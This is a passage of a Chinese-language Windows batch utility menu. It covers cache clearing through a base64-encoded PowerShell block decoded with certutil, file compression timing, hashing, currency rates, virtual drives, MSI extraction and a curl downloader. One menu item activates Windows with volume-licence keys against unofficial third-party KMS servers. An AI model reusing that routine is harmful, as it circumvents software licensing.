echo ZwBlAHMAKABjAHUAcgByAGUAbgB0AC4AVABvAGsAZQBuACwAIABmAGEAbABzAGUA
echo LAAgAHIAZQBmACAAbgBlAHcAcwB0ACwAIAAwACwAIABJAG4AdABQAHQAcgAuAFoA
echo ZQByAG8ALAAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwApACAAPwAgADEAIAA6ACAA
echo MAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgA
echo bgB1AG0AIAA9AD0AIAAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIABuAGUAdwAgAEUAeABjAGUAcAB0AGkA
echo bwBuACgAIgBFAHIAcgBvAHIAIABpAG4AIABBAGQAagB1AHMAdABUAG8AawBlAG4A
echo UAByAGkAdgBpAGwAZQBnAGUAcwA6ACAAIgAsACAAbgBlAHcAIABXAGkAbgAzADIA
echo RQB4AGMAZQBwAHQAaQBvAG4AKABNAGEAcgBzAGgAYQBsAC4ARwBlAHQATABhAHMA
echo dABXAGkAbgAzADIARQByAHIAbwByACgAKQApACkAOwANAAoAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAG4AdQBtACAAIQA9ACAA
echo MAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAA
echo IAAgACAAfQANAAoAIAAgACAAIAB9AA0ACgANAAoAIAAgACAAIABbAFMAdAByAHUA
echo YwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUA
echo ZQBuAHQAaQBhAGwALAAgAFAAYQBjAGsAIAA9ACAAMQApAF0ADQAKACAAIAAgACAA
echo cwB0AHIAdQBjAHQAIABTAFkAUwBUAEUATQBfAEMAQQBDAEgARQBfAEkATgBGAE8A
echo UgBNAEEAVABJAE8ATgANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAA
echo cAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAQwB1AHIAcgBlAG4AdABTAGkAegBlADsA
echo DQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABQAGUA
echo YQBrAFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAA
echo dQBpAG4AdAAgAFAAYQBnAGUARgBhAHUAbAB0AEMAbwB1AG4AdAA7AA0ACgAgACAA
echo IAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAATQBpAG4AaQBtAHUA
echo bQBXAG8AcgBrAGkAbgBnAFMAZQB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUA
echo YgBsAGkAYwAgAHUAaQBuAHQAIABNAGEAeABpAG0AdQBtAFcAbwByAGsAaQBuAGcA
echo UwBlAHQAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4A
echo dAAgAFUAbgB1AHMAZQBkADEAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwA
echo aQBjACAAdQBpAG4AdAAgAFUAbgB1AHMAZQBkADIAOwANAAoAIAAgACAAIAAgACAA
echo IAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAFUAbgB1AHMAZQBkADMAOwANAAoA
echo IAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAFUAbgB1AHMA
echo ZQBkADQAOwANAAoAIAAgACAAIAB9AA0ACgANAAoAIAAgACAAIABbAFMAdAByAHUA
echo YwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUA
echo ZQBuAHQAaQBhAGwALAAgAFAAYQBjAGsAIAA9ACAAMQApAF0ADQAKACAAIAAgACAA
echo cwB0AHIAdQBjAHQAIABTAFkAUwBUAEUATQBfAEMAQQBDAEgARQBfAEkATgBGAE8A
echo UgBNAEEAVABJAE8ATgBfADYANABfAEIASQBUAA0ACgAgACAAIAAgAHsADQAKACAA
echo IAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGwAbwBuAGcAIABDAHUAcgByAGUA
echo bgB0AFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAA
echo bABvAG4AZwAgAFAAZQBhAGsAUwBpAHoAZQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo cAB1AGIAbABpAGMAIABsAG8AbgBnACAAUABhAGcAZQBGAGEAdQBsAHQAQwBvAHUA
echo bgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGwAbwBuAGcA
echo IABNAGkAbgBpAG0AdQBtAFcAbwByAGsAaQBuAGcAUwBlAHQAOwANAAoAIAAgACAA
echo IAAgACAAIAAgAHAAdQBiAGwAaQBjACAAbABvAG4AZwAgAE0AYQB4AGkAbQB1AG0A
echo VwBvAHIAawBpAG4AZwBTAGUAdAA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIA
echo bABpAGMAIABsAG8AbgBnACAAVQBuAHUAcwBlAGQAMQA7AA0ACgAgACAAIAAgACAA
echo IAAgACAAcAB1AGIAbABpAGMAIABsAG8AbgBnACAAVQBuAHUAcwBlAGQAMgA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABsAG8AbgBnACAAVQBuAHUA
echo cwBlAGQAMwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABsAG8A
echo bgBnACAAVQBuAHUAcwBlAGQANAA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAA
echo IAAgAFsAUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkA
echo bgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAAsACAAUABhAGMAawAgAD0AIAAxACkA
echo XQANAAoAIAAgACAAIABpAG4AdABlAHIAbgBhAGwAIABzAHQAcgB1AGMAdAAgAFQA
echo bwBrAFAAcgBpAHYAMQBMAHUAaQBkAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAA
echo IAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQwBvAHUAbgB0ADsADQAKACAA
echo IAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGwAbwBuAGcAIABMAHUAaQBkADsA
echo DQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQQB0AHQA
echo cgA7AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKACIAQAANAAoADQAKAEEAZABkAC0A
echo VAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABTAG8A
echo dQByAGMAZQAgAC0ATABhAG4AZwB1AGEAZwBlACAAQwBTAGgAYQByAHAAIAANAAoA
echo DQAKAFsAQwBsAGUAYQByAFMAdABhAG4AZABiAHkATABpAHMAdAAuAFAAcgBvAGcA
echo cgBhAG0AXQA6ADoAQwBsAGUAYQByAEYAaQBsAGUAUwB5AHMAdABlAG0AQwBhAGMA
echo aABlACgAJAB0AHIAdQBlACkA
)>%temp%\base
certutil -decode -f "%temp%\base" %temp%\powershell.ps1>nul
net stop sysmain>nul 2>nul
if exist %temp%\listfile.log del/f/q %temp%\listfile.log
if exist %temp%\loadtime.log del/f/q %temp%\loadtime.log
if exist %temp%\uncompact.log del/f/q %temp%\uncompact.log
echo 记录文件列表...
for /f "delims=" %%a in ('"dir/a/s/b "%url%""') do (call :listfile "%%a" %%~za %%~xa)
echo 清空缓存...
call :powershell
echo 记录文件压缩前的读取时间...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (call :loadfile %%a)
echo 压缩文件...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (compact /c %%a)
echo 清空缓存...
call :powershell
echo 比较压缩前后的读取时间...
for /f "tokens=*" %%a in (%temp%\loadtime.log) do (call :ifloadfile %%a)
echo 解压不适合压缩的文件...
for /f "tokens=*" %%a in (%temp%\uncompact.log) do (compact /u %%a)
net start sysmain>nul 2>nul
del/f/q %temp%\powershell.ps1
del/f/q %temp%\listfile.log
del/f/q %temp%\loadtime.log
del/f/q %temp%\uncompact.log
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:ifloadfile
set file=%1
set loadtime=%2
call :copyfile %file%
if 0x%sjc% geq 0x%loadtime% echo %file%>>%temp%\uncompact.log
goto :eof
:loadfile
set file=%1
call :copyfile %file%
echo %file% %sjc%>>%temp%\loadtime.log
goto :eof
:copyfile
set file=%1
set kssj=%time%
copy /z %file% nul
set jssj=%time%
call :sjc %kssj% %jssj%
echo 读取用时: %sjc:~4,2%.%sjc:~6,2%s
goto :eof
:listfile
set url=%1
set size=%2
set name=%3
dir/ad %url%>nul 2>nul&&goto :eof
if "%name%" equ ".zip" goto :eof
if "%name%" equ ".rar" goto :eof
if "%name%" equ ".7z" goto :eof
if "%name%" equ ".png" goto :eof
if "%name%" equ ".jpg" goto :eof
if "%name%" equ ".mp3" goto :eof
if "%name%" equ ".acc" goto :eof
if "%name%" equ ".m4a" goto :eof
if "%name%" equ ".flac" goto :eof
if "%name%" equ ".ape" goto :eof
if "%name%" equ ".mp4" goto :eof
if "%name%" equ ".avi" goto :eof
if "%name%" equ ".flv" goto :eof
if "%name%" equ ".f4v" goto :eof
if "%name%" equ ".mkv" goto :eof
if "%name%" equ ".3gp" goto :eof
if "%name%" equ ".cab" goto :eof
if "%name%" equ ".pdf" goto :eof
if %size% gtr 4096 if %size% leq 104857600 echo %url%>>%temp%\listfile.log
goto :eof
:66
title 计算文件哈希值%system%
cls
set url=
set /p url=输入文件路径(e=返回菜单):
if not defined url goto 66
if "%url:~0,1%%url:~-1%" neq """" for /f "delims=" %%a in ('"echo %url%"') do (set url="%%~a")
if /i !url! equ "e" goto memuv2 
if not exist "!url!" echo 文件不存在&timeout /t 2 /nobreak>nul&goto 66
dir /ad !url!>nul 2>nul&&echo 路径 !url! 不是一个文件&&timeout /t 2 /nobreak>nul&&goto 66
cls
echo 文件: 		%url%
for /f "delims=" %%a in ("!url!") do (
if %%~za gtr 1024 (
call :xdwjs %%~za b dw
echo;文件大小: 	!dw! %%~za字节
) else (
echo;文件大小: 	%%~za字节
)
)
call :hash %url% md5
echo;
echo MD5:	 %hash%
call :hash %url% sha1
echo SHA-1:	 %hash%
call :hash %url% sha256
echo SHA-256: %hash%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:67
cls
title 显示货币汇率%system%
set mainurl=https://api.coincap.io/v2/assets/
set mainurl1=https://api.coincap.io/v2/rates/
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
echo 下载汇率文件(总共13个文件)...
set xzflag=::
set xzflag1=
if exist %systemroot%\system32\curl.exe (set xzflag1=::&set xzflag=)
%xzflag%pushd %temp%
%xzflag%curl !proxy! -A !ua! -# -Z -C - --retry 1 --retry-delay 1 --connect-timeout 5 -o cny.json %mainurl1%chinese-yuan-renminbi -o doge.json %mainurl%dogecoin -o btc.json %mainurl%bitcoin -o eth.json %mainurl%ethereum -o au.json %mainurl1%gold-ounce -o ag.json %mainurl1%silver-ounce -o eur.json %mainurl1%euro -o gbp.json %mainurl1%british-pound-sterling -o jpy.json %mainurl1%japanese-yen -o hkd.json %mainurl1%hong-kong-dollar -o twd.json %mainurl1%new-taiwan-dollar -o xmr.json %mainurl%monero -o filecoin.json %mainurl%filecoin
%xzflag%popd
%xzflag1%bitsadmin /transfer 下载汇率文件... /priority FOREGROUND %mainurl1%chinese-yuan-renminbi %temp%\cny.json %mainurl%dogecoin %temp%\doge.json %mainurl%bitcoin %temp%\btc.json %mainurl%ethereum %temp%\eth.json %mainurl1%gold-ounce %temp%\au.json %mainurl1%silver-ounce %temp%\ag.json %mainurl1%euro %temp%\eur.json %mainurl1%british-pound-sterling %temp%\gbp.json %mainurl1%japanese-yen %temp%\jpy.json %mainurl1%hong-kong-dollar %temp%\hkd.json %mainurl1%new-taiwan-dollar %temp%\twd.json %mainurl%monero %temp%\xmr.json %mainurl%filecoin %temp%\filecoin.json
cls
echo 处理汇率文件...
for /f "delims=:} tokens=7" %%a in (%temp%\cny.json) do (set cnytousd=%%a)
if not defined cnytousd set cnytousd=1
set cnytousd=%cnytousd:"=%
for /f "delims=:, tokens=19,21" %%a in (%temp%\doge.json) do (set dogetousd=%%a&&set doge24h=%%b)
if not defined dogetousd set dogetousd=1&&set doge24h=0
set dogetousd=%dogetousd:"=%
set doge24h=%doge24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %doge24h%"') do (set doge24h1=%%a&&set doge24h2=%%b)
set doge24h=%doge24h1%.%doge24h2:~0,3%
for /f "delims=:, tokens=19,21" %%a in (%temp%\btc.json) do (set btctousd=%%a&&set btc24h=%%b)
if not defined btctousd set btctousd=1&&set btc24h=0
set btctousd=%btctousd:"=%
set btc24h=%btc24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %btc24h%"') do (set btc24h1=%%a&&set btc24h2=%%b)
set btc24h=%btc24h1%.%btc24h2:~0,3%
for /f "delims=:, tokens=19,21" %%a in (%temp%\eth.json) do (set ethtousd=%%a&&set eth24h=%%b)
if not defined ethtousd set ethtousd=1&&set eth24h=0
set ethtousd=%ethtousd:"=%
set eth24h=%eth24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %eth24h%"') do (set eth24h1=%%a&&set eth24h2=%%b)
set eth24h=%eth24h1%.%eth24h2:~0,3%
for /f "delims=:, tokens=19,21" %%a in (%temp%\filecoin.json) do (set filetousd=%%a&&set file24h=%%b)
if not defined filetousd set filetousd=1&&file24h=0
set filetousd=%filetousd:"=%
set file24h=%file24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo;%file24h%"') do (set file24h1=%%a&&set file24h2=%%b)
set file24h=%file24h1%.%file24h2:~0,3%
for /f "delims=:} tokens=7" %%a in (%temp%\au.json) do (set autousd=%%a)
if not defined autousd set autousd=1
set autousd=%autousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\ag.json) do (set agtousd=%%a)
if not defined agtousd set agtousd=1
set agtousd=%agtousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\eur.json) do (set eurtousd=%%a)
if not defined eurtousd set eurtousd=1
set eurtousd=%eurtousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\gbp.json) do (set gbptousd=%%a)
if not defined gbptousd set gbptousd=1
set gbptousd=%gbptousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\jpy.json) do (set jpytousd=%%a)
if not defined jpytousd set jpytousd=1
set jpytousd=%jpytousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\hkd.json) do (set hkdtousd=%%a)
if not defined hkdtousd set hkdtousd=1
set hkdtousd=%hkdtousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\twd.json) do (set twdtousd=%%a)
if not defined twdtousd set twdtousd=1
set hkdtousd=%hkdtousd:"=%
for /f "delims=:, tokens=19,21" %%a in (%temp%\xmr.json) do (set xmrtousd=%%a&&set xmr24h=%%b)
if not defined xmrtousd set xmrtousd=1&&set xmr24h=0
set xmrtousd=%xmrtousd:"=%
set xmr24h=%xmr24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %xmr24h%"') do (set xmr24h1=%%a&&set xmr24h2=%%b)
set xmr24h=%xmr24h1%.%xmr24h2:~0,3%
call :Division %dogetousd% %cnytousd% 8 dogetocny
call :Division %btctousd% %cnytousd% 8 btctocny
call :Division %ethtousd% %cnytousd% 8 ethtocny
call :Division %eurtousd% %cnytousd% 8 eurtocny
call :Division %gbptousd% %cnytousd% 8 gbptocny
call :Division %jpytousd% %cnytousd% 8 jpytocny
call :Division %hkdtousd% %cnytousd% 8 hkdtocny
call :Division %twdtousd% %cnytousd% 8 twdtocny
call :Division %xmrtousd% %cnytousd% 8 xmrtocny
call :Division %filetousd% %cnytousd% 8 filetocny
call :Division 1 %cnytousd% 3 usdtocny
call :Division %autousd% 31.1034768 3 autocny
call :Division %agtousd% 31.1034768 3 agtocny
call :xcf !autocny! !usdtocny! autocny
call :xcf !agtocny! !usdtocny! agtocny
rem for /f "delims=" %%a in ('"powershell %dogetousd%/%cnytousd%"') do (set dogetocny=%%a)
rem for /f "delims=" %%a in ('"powershell %btctousd%/%cnytousd%"') do (set btctocny=%%a)
rem for /f "delims=" %%a in ('"powershell %ethtousd%/%cnytousd%"') do (set ethtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %eurtousd%/%cnytousd%"') do (set eurtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %gbptousd%/%cnytousd%"') do (set gbptocny=%%a)
rem for /f "delims=" %%a in ('"powershell %jpytousd%/%cnytousd%"') do (set jpytocny=%%a)
rem for /f "delims=" %%a in ('"powershell %hkdtousd%/%cnytousd%"') do (set hkdtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %twdtousd%/%cnytousd%"') do (set twdtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %xmrtousd%/%cnytousd%"') do (set xmrtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %filetousd%/%cnytousd%"') do (set filetocny=%%a)
rem for /f "delims=" %%a in ('"powershell 1/%cnytousd%"') do (set usdtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %autousd%/31.1034768*%usdtocny%"') do (set autocny=%%a)
rem for /f "delims=" %%a in ('"powershell %agtousd%/31.1034768*%usdtocny%"') do (set agtocny=%%a)
cls
echo 黄金XAU    → 人民币CNY
echo 	1  → !autocny!
echo;
echo 白银XAG    → 人民币CNY
echo 	1  → !agtocny!
echo;
echo 以太坊ETH  → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !ethtocny!		24小时涨跌幅: <nul
if "!eth24h:~0,1!" equ "-" (call :colortxt a !eth24h!) else (call :colortxt c +!eth24h!)
set /p =%% <nul
echo;
echo;
echo 比特币BTC  → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !btctocny!		24小时涨跌幅: <nul
if "!btc24h:~0,1!" equ "-" (call :colortxt a !btc24h!) else (call :colortxt c +!btc24h!)
set /p =%% <nul
echo;
echo;
echo 门罗币XMR  → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !xmrtocny!		24小时涨跌幅: <nul
if "!xmr24h:~0,1!" equ "-" (call :colortxt a !xmr24h!) else (call :colortxt c +!xmr24h!)
set /p =%% <nul
echo;
echo;
echo;文件币FILE → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !filetocny!		24小时涨跌幅: <nul
if "!file24h:~0,1!" equ "-" (call :colortxt a !file24h!) else (call :colortxt c +!file24h!)
set /p =%% <nul
echo;
echo;
echo 狗狗币DOGE → 人民币CNY
set /p =!cswz1![]	<nul
set /p =1  → !dogetocny!			24小时涨跌幅: <nul
if "!doge24h:~0,1!" equ "-" (call :colortxt a !doge24h!) else (call :colortxt c +!doge24h!)
set /p =%% <nul
echo;
echo;
echo 美元USD    → 人民币CNY
echo 	1  → !usdtocny!
echo;
echo 欧元EUR    → 人民币CNY
echo 	1  → !eurtocny!
echo;
echo 英镑GBP    → 人民币CNY
echo 	1  → !gbptocny!
echo;
echo 日元JPY    → 人民币CNY
echo 	1  → !jpytocny!
echo;
echo 港币HKD    → 人民币CNY
echo 	1  → !hkdtocny!
echo;
echo 新台币TWD  → 人民币CNY
echo 	1  → !twdtocny!
echo _______________________________________________________________________________
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:68
cls
title 创建虚拟盘符%system%
echo [1]将路径与盘符关联
echo [2]删除虚拟盘符
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 120 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 68(1)
if "%errorlevel%" equ "2" goto 68(2)
if "%errorlevel%" equ "3" goto memuv2
goto memuv2
:68(1)
title 将路径与盘符关联%system%
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
echo 当前已有盘符: %sypf%
echo 虚拟盘符:
for /f "delims=" %%a in ('"subst"') do (echo %%a)
echo _______________________________________________________________________________
set newpf=
set /p newpf=输入要创建的新盘符:
if not defined newpf goto 68
set newpf|findstr /i "\<[a-z]\>">nul
if "%errorlevel%" neq "0" echo 无效输入&timeout /t 2 /nobreak>nul&goto 68(1)
set gllj=
set /p gllj=输入要关联的路径:
if not defined gllj goto 68
set gllj="%gllj:|=%"
if "%gllj:~0,1%%gllj:~-1%" neq """" for /f "delims=" %%a in ('"echo %gllj%"') do (set %gllj%="%%~a")
if /i !gglj! equ "" goto memuv2 
if not exist "!gllj!" echo 路径不存在&timeout /t 2 /nobreak>nul&goto 68(1)
dir /ad !gllj!>nul 2>nul||echo 路径 !gllj! 不是一个文件夹&&timeout /t 2 /nobreak>nul&&goto 68(1)
subst %newpf%: %gllj%
if "%errorlevel%" equ "0" (echo 创建成功&timeout /t 2 /nobreak>nul&goto 68) else (echo 创建失败&timeout /t 2 /nobreak>nul&goto 68)
:68(2)
title 删除虚拟盘符%system%
cls
echo 虚拟盘符:
for /f "delims=" %%a in ('"subst"') do (echo %%a)
echo _______________________________________________________________________________
set xzxnp=
set /p xzxnp=输入要卸载的盘符:
if not defined xzxnp goto 68
set xzxnp|findstr /i "\<[a-z]\>">nul
if "%errorlevel%" neq "0" echo 无效输入&timeout /t 2 /nobreak>nul&goto 68(2)
subst %xzxnp%: /d
if "%errorlevel%" equ "0" (echo 卸载成功&timeout /t 2 /nobreak>nul&goto 68) else (echo 卸载失败&timeout /t 2 /nobreak>nul&goto 68)
:69
title 解压msi安装文件%system%
cls
set msiurl=
set /p msiurl=输入msi文件路径(e=返回菜单):
if not defined msiurl goto memuv2
if "%msiurl:~0,1%%msiurl:~-1%" neq """" for /f "delims=" %%a in ('"echo %msiurl%"') do (set msiurl="%%~a")
if /i !msiurl! equ "e" goto memuv2
if not exist "!msiurl!" echo 文件不存在&timeout /t 2 /nobreak>nul&goto memuv2
dir /ad !msiurl!>nul 2>nul&&echo 路径 !msiurl! 不是一个文件&&timeout /t 2 /nobreak>nul&&goto memuv2
for /f "delims=" %%a in ('"echo !msiurl!"') do (if /i "%%~xa" neq ".msi" echo 不是msi文件&&timeout /t 2 /nobreak>nul&&goto memuv2)
set msidir=
set /p msidir=输入msi文件解压路径(默认路径为msi文件所在路径)(e=返回菜单):
if not defined msidir for /f "delims=" %%a in ('"echo !msiurl!"') do (set msidir="%%~dpna")
if "%msidir:~0,1%%msidir:~-1%" neq """" for /f "delims=" %%a in ('"echo %msidir%"') do (set msidir="%%~a")
if /i !msidir! equ "e" goto memuv2
echo 开始解压...
if not exist "!msidir!" (msiexec /a !msiurl! /quiet /passive /qn targetdir=!msidir!) else (echo 不能解压到已存在的文件夹&&timeout /t 2 /nobreak>nul)
rd /s /q %systemdriver%\config.msi>nul 2>nul
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:70
title 生成CMD控制台色彩表%system%
cls
color 07
set cs=0
for /l %%a in (40,1,47) do (for /l %%b in (90,1,97) do (
if %%a lss 10 (set xh1=0%%a) else (set xh1=%%a)
if %%b lss 10 (set xh2=0%%b) else (set xh2=%%b)
if !xh1! equ 40 set bj=0
if !xh1! equ 41 set bj=4
if !xh1! equ 42 set bj=2
if !xh1! equ 43 set bj=6
if !xh1! equ 44 set bj=1
if !xh1! equ 45 set bj=5
if !xh1! equ 46 set bj=3
if !xh1! equ 47 set bj=7
if !xh2! equ 90 set zt=8
if !xh2! equ 91 set zt=c
if !xh2! equ 92 set zt=a
if !xh2! equ 93 set zt=e
if !xh2! equ 94 set zt=9
if !xh2! equ 95 set zt=d
if !xh2! equ 96 set zt=b
if !xh2! equ 97 set zt=f
if !cs! lss 7 (set /p =!cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m<nul&set /a cs=!cs!+1) else (echo !cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m&set cs=0)))
set cs=0
for /l %%a in (40,1,47) do (for /l %%b in (90,1,97) do (
if %%a lss 10 (set xh1=0%%a) else (set xh1=%%a)
if %%b lss 10 (set xh2=0%%b) else (set xh2=%%b)
if !cs! lss 7 (set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul&set /a cs=!cs!+1) else (echo !cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m&set cs=0)))
for /l %%a in (90,1,97) do (for /l %%b in (40,1,47) do (
if %%a lss 10 (set xh1=0%%a) else (set xh1=%%a)
if %%b lss 10 (set xh2=0%%b) else (set xh2=%%b)
if !cs! lss 7 (set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul&set /a cs=!cs!+1) else (echo !cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m&set cs=0)))
set /p =!cswz!s!cswz!27;0H<nul
for /l %%b in (1,1,4) do (
echo;
for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;255;0;%%am !cswz!0m<nul)
for /l %%a in (0,13,255) do (set /p =!cswz!48;2;255;%%a;0m !cswz!0m<nul)
for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;%%a;255;0m !cswz!0m<nul)
for /l %%a in (0,13,255) do (set /p =!cswz!48;2;0;255;%%am !cswz!0m<nul)
for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;0;%%a;255m !cswz!0m<nul)
for /l %%a in (0,13,255) do (set /p =!cswz!48;2;%%a;0;255m !cswz!0m<nul))
set /p =!cswz!u<nul
echo _______________________________________________________________________________
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:71
title KMS激活Windows 10%system%
cls
set Core=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
set CoreCountrySpecific=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
set CoreN=3KHY7-WNT83-DGQKR-F7HPR-844BM
set CoreSingleLanguage=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
set ProfessionalStudent=YNXW3-HV3VB-Y83VG-KPBXM-6VH3Q
set ProfessionalStudentN=8G9XJ-GN6PJ-GW787-MVV7G-GMR99
set Professional=W269N-WFGWX-YVC9B-4J6C9-T83GX
set ProfessionalN=MH37W-N47XK-V7XM9-C7227-GCQG9
set ProfessionalSN=8Q36Y-N2F39-HRMHT-4XW33-TCQR4
set ProfessionalWMC=NKPM6-TCVPT-3HRFX-Q4H9B-QJ34Y
set Enterprise=NPPR9-FWDCX-D2C8J-H872K-2YT43
set EnterpriseN=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
set Education=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
set EducationN=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
set EnterpriseS=WNMTR-4C88C-JK8YV-HQ7T2-76DF9
set EnterpriseSN=2F77B-TNFGY-69QQF-B8YKP-D69TJ
for /f "tokens=3 delims= " %%a in ('reg QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "EditionID"') do set sysid=%%a
set server=
if defined !sysid! (echo 系统名称: %system:~3%) else (call :colortxt c 没有当前系统的激活密钥&echo;)
ping /n 1 www.baidu.com>nul||call :colortxt c 没有网络连接&echo;
echo 请选择KMS服务器
echo _______________________________________________________________________________
echo [1]kms.loli.best
echo [2]kms.03k.org
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 120 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" set server=kms.loli.best&goto 71.1
if "%errorlevel%" equ "2" set server=kms.03k.org&goto 71.1
if "%errorlevel%" equ "3" goto memuv2
goto 71
:71.1
cls
set /p =KMS服务器: <nul
call :colortxt a !server!
echo;
set/p =系统名称: <nul
call :colortxt a "%system:~3%"
echo;
if defined sysid cscript //Nologo %windir%\system32\slmgr.vbs /ipk !%sysid%!
cscript //Nologo %windir%\system32\slmgr.vbs /skms !server!
cscript //Nologo %windir%\system32\slmgr.vbs /ato
start slmgr.vbs -xpr
echo _______________________________________________________________________________
echo 如果显示激活失败[错误: 0xC004F074]，应更换KMS服务器.
echo 按任意键返回菜单&pause>nul
goto memuv2
:72
title curl多进程下载%system%
cls
if not exist %systemroot%\system32\curl.exe (
if not exist .\curl.exe (echo 没有找到curl.exe&timeout /t 2 /nobreak>nul&&goto memuv2))
:72.1
cls
set filename=
set url=
set /p url=输入下载链接(e=返回): 
if not defined url echo 链接不能为空!&timeout /t 2 /nobreak>nul&&goto 72.1
if "!url!" equ "e" goto memuv2
set tr=
set /p tr=输入下载进程数(默认16): 
if not defined tr set tr=16
set tr|findstr "\<[0-9]*\>">nul
if !errorlevel! neq 0 (echo 只能输入数字!&timeout /t 2 /nobreak>nul&&goto 72.1)
set dir=
set /p dir=输入保存路径(默认当前DOS工具箱所在路径): 
if not defined dir (for /f "delims=" %%a in ("!weizhi!") do (set dir=%%~dpa))
if not exist "!dir!" (echo 路径 !dir! 不存在&timeout /t 2 /nobreak>nul&goto 72.1)
dir /ad !dir!>nul 2>nul||echo 路径 !dir! 不是一个文件夹&&timeout /t 2 /nobreak>nul&&goto 72.1
cls
echo 开始获取文件信息...
set filename=
